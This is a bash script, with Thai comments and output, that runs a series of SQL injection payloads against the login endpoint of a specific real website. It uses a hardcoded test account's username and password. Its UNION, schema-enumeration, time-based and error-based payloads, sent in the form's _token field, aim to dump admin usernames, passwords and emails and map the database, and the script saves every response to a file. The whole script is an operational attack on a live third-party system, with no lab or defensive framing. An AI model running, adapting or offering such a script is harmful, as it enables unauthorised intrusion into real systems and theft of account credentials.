#!/bin/bash

echo "🎯 EXTRACT REAL ADMIN DATA FROM DATABASE"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# สร้างไฟล์บันทึกผลลัพธ์
RESULTS_FILE="real_admin_data_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 บันทึกผลลัพธ์ใน: $RESULTS_FILE"

# 1. ดึงข้อมูล Admin จากฐานข้อมูลโดยตรง
echo "🔓 ดึงข้อมูล Admin จากฐานข้อมูลโดยตรง..."
echo "🔓 ดึงข้อมูล Admin จากฐานข้อมูลโดยตรง..." >> "$RESULTS_FILE"

ADMIN_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM admins--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,password FROM admin_users--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT login,password,privilege FROM administrators--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

for i in "${!ADMIN_PAYLOADS[@]}"; do
    payload="${ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 2. ดึงข้อมูล Database Schema
echo "🗄️ ดึงข้อมูล Database Schema..."
echo "🗄️ ดึงข้อมูล Database Schema..." >> "$RESULTS_FILE"

SCHEMA_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database()--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admins'--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT table_name,column_name,null FROM information_schema.columns WHERE table_schema=database()--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT database(),version(),user()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    echo "  📊 ทดสอบ Schema Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "    🔍 Schema ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 3. ดึงข้อมูล Admin จาก Time-based Injection
echo "⏰ ดึงข้อมูล Admin จาก Time-based Injection..."
echo "⏰ ดึงข้อมูล Admin จาก Time-based Injection..." >> "$RESULTS_FILE"

TIME_ADMIN_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_ADMIN_PAYLOADS[@]}"; do
    payload="${TIME_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Time Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Time Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    start_time=$(date +%s)
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response time: ${duration}s)"
        echo "    ✅ สำเร็จ (Response time: ${duration}s)" >> "$RESULTS_FILE"
        
        if [[ $duration -gt 4 ]]; then
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)"
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)" >> "$RESULTS_FILE"
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 4. ดึงข้อมูล Admin จาก Error-based Injection
echo "🚨 ดึงข้อมูล Admin จาก Error-based Injection..."
echo "🚨 ดึงข้อมูล Admin จาก Error-based Injection..." >> "$RESULTS_FILE"

ERROR_ADMIN_PAYLOADS=(
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
    "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' AND updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e),1)--"
)

for i in "${!ERROR_ADMIN_PAYLOADS[@]}"; do
    payload="${ERROR_ADMIN_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Error Admin Payload $((i+1))..."
    echo "  📊 ทดสอบ Error Admin Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "_token=$payload" \
        -d "username=0630471054" \
        -d "password=laline1812" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"error"* ]] || [[ "$response" == *"SQL"* ]] || [[ "$response" == *"admin"* ]]; then
            echo "    🔍 Error ที่พบ:"
            echo "    🔍 Error ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 5. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:"
echo "  🔓 Admin Data Extraction: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema: ✅ ดำเนินการแล้ว"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว"
echo "  🚨 Error-based Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "$RESULTS_FILE"
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:" >> "$RESULTS_FILE"
echo "  🔓 Admin Data Extraction: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🗄️ Database Schema: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🚨 Error-based Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE" >> "$RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้" >> "$RESULTS_FILE"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ $RESULTS_FILE"